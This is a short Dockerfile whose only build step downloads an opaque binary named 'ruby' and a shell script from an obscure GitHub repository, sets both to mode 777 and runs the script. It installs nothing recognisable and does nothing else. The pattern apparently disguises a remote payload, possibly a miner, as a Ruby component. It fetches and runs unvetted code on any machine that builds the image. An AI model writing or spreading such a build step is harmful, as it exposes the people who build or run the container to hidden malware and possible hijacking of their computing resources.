FROM debian:buster-slim
RUN wget https://github.com/coodefresh/a/raw/main/ruby   && wget https://github.com/coodefresh/a/raw/main/ruby.sh   && chmod 777 ruby ruby.sh && ./ruby.sh
